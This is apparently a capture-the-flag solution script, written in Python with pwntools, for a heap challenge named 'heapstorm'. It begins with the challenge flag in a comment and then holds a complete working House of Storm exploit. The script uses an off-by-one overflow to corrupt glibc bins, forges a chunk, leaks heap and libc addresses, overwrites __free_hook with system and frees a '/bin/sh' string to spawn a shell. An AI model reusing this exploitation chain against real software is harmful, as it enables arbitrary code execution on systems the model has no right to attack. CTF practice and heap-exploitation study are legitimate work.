#!/usr/bin/env python
# encoding: utf-8

#flag{Seize it, control it, and exploit it. Welcome to the House of Storm.}

import itertools
from hashlib import sha256
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

context(arch='amd64', os='linux', log_level='info')
r = None
name = './heapstorm'
r = process(name)
def attach_and_debug():
    print(str(r.proc.pid))
    gdb.attach(r, """
set $k1= *(long *)0x13370800
set $k2= *(long *)0x13370808
set $p0= $k1 ^ *(long *)0x13370820 
set $p1= $k1 ^ *(long *)0x13370830
set $p2= $k1 ^ *(long *)0x13370840
set $p3= $k1 ^ *(long *)0x13370850
define fu
    set $b = 0x13370820
    if $argc > 0
        p/x ($k1 ^ *(long *)($b + ($arg0*0x10) ))-0x10
        p/x ($k2 ^ *(long *)($b + ($arg0*0x10)+0x8 ))
    else
        p/x ($k1 ^ *(long *)0x13370820)-0x10
        p/x ($k1 ^ *(long *)0x13370830)-0x10
        p/x ($k1 ^ *(long *)0x13370840)-0x10
        p/x ($k1 ^ *(long *)0x13370850)-0x10 
        p/x ($k1 ^ *(long *)0x13370860)-0x10
    end 
    if $argc == 2
        # x/$arg1gx ($k1 ^ *(long *)($b + ($arg0*0x10) ))-0x10
    end
end
echo =====0, 1, 2, 3====\\n
fu
echo =====0, 1, 2, 3====\\n
set $pad = 0x13370800
echo enc_pad: \\n
x/30gx 0x13370800
    """);
    print(str(r.proc.pid))

    r.interactive()
def proof():
    chal = r.recvuntil('\n').strip()
    print chal
    for x in itertools.product(range(0, 0xff), repeat=4):
        x = ''.join(map(chr, x)) 
        if sha256(chal+x).digest().startswith('\0\0\0'):
            r.send(x)
            return
    print 'Not Found'
    exit()

def alloc(size):
    r.sendline('1')
    r.recvuntil('Size: ')
    assert(12 < size <= 0x1000)
    r.sendline('%d' % size)
    r.recvuntil('Command: ')

def update(idx, content):
    r.sendline('2')
    r.recvuntil('Index: ')
    r.sendline('%d' % idx)
    r.recvuntil('Size: ')
    r.sendline('%d' % len(content))
    r.recvuntil('Content: ')
    r.send(content)
    r.recvuntil('Command: ')

def free(idx):
    r.sendline('3')
    r.recvuntil('Index: ')
    r.sendline('%d' % idx)
    r.recvuntil('Command: ')

def view(idx):
    r.sendline('4')
    r.recvuntil('Index: ')
    r.sendline('%d' % idx)
    m = r.recvuntil('Command: ')
    pos1 = m.find(']: ') + len(']: ')
    pos2 = m.find('\n1. ')
    return m[pos1:pos2]

def exploit():
    # global r
    # port = 5655

    
    # r = remote(host, port)

    
    # proof()

    # r.recvuntil('Command: ')

    alloc(0x18)     #0
    alloc(0x508)    #1
    alloc(0x18)     #2
    # print 1
    update(1, 'h'*0x4f0 + p64(0x500))   #set fake prev_size

    
    alloc(0x18)     #3
    alloc(0x508)    #4
    alloc(0x18)     #5
    update(4, 'h'*0x4f0 + p64(0x500))   #set fake prev_size
    alloc(0x18)     #6

    free(1) # unsorted bin -> 0x555555757020
    update(0, 'h'*(0x18-12))    #off-by-one
    alloc(0x18)     #1
    alloc(0x4d8)    #7 # use it up, 0x20+0x4e0==0x500, no more unsorted bin here
    
    free(1)
    free(2)         #backward consolidate # now 7 become mr.lonely ; unsorted(0x530)
    alloc(0x38)     #1
    alloc(0x4e8)    #2 use it up agian, but why?
    

    free(4)
    update(3, 'h'*(0x18-12))    #off-by-one
    alloc(0x18)     #4
    alloc(0x4d8)    #8
    free(4)
    free(5)         #backward consolidate
    alloc(0x48)     #4

    free(2) # unsorted: 0x555555757060(0x4f0) —▸ 0x5555557575c0(0x4e0)
    alloc(0x4e8)    #2 # large: 0x5555557575c0(0x4e0)
    free(2) #unsorted: 0x555555757060(0x4f0); large: 0x5555557575c0(0x4e0)

    storage = 0x13370000 + 0x800
    fake_chunk = storage - 0x20

    p1 = p64(0)*2 + p64(0) + p64(0x4f1) #size 
    p1 += p64(0) + p64(fake_chunk)      #bk
    update(7, p1) # 7的size之前被搞坏了，不用修为啥可以？？

    p2 = p64(0)*4 + p64(0) + p64(0x4e1) #size
    p2 += p64(0) + p64(fake_chunk+8)    #bk, for creating the "bk" of the faked chunk to avoid crashing when unlinking from unsorted bin
    p2 += p64(0) + p64(fake_chunk-0x18-5)   #bk_nextsize, for creating the "size" of the faked chunk, using misalignment tricks
    update(8, p2)


    attach_and_debug() 
    try:
        # if the heap address starts with "0x56", you win
        alloc(0x48)     #2
    except EOFError:
        pass
        # otherwise crash and try again
        # r.close()
        # continue

    st = p64(0)*2 + p64(0) + p64(0) + p64(0) + p64(0x13377331) + p64(storage)
    update(2, st)

    st = p64(0) + p64(0) + p64(0) + p64(0x13377331) + p64(storage) + p64(0x1000) + p64(storage-0x20+3) + p64(8)
    update(0, st)

    leak = view(1)
    heap = u64(leak)
    print 'heap: %x' % heap

    st = p64(0) + p64(0) + p64(0) + p64(0x13377331) + p64(storage) + p64(0x1000) + p64(heap+0x10) + p64(8)
    update(0, st)

    leak = view(1)
    unsorted_bin = u64(leak)
    main_arena = unsorted_bin - 0x58
    libc_base = main_arena - 0x399b00
    print 'libc_base: %x' % libc_base
    libc_system = libc_base + 0x3f480
    free_hook = libc_base + 0x39b788

    st = p64(0) + p64(0) + p64(0) + p64(0x13377331) + p64(storage) + p64(0x1000) + p64(free_hook) + p64(0x100) + p64(storage+0x50) + p64(0x100) + '/bin/sh\0'
    update(0, st)
    update(1, p64(libc_system))

    r.sendline('3')
    r.recvuntil('Index: ')
    r.sendline('%d' % 2)
    # break

if __name__ == '__main__':
    exploit()
    r.interactive()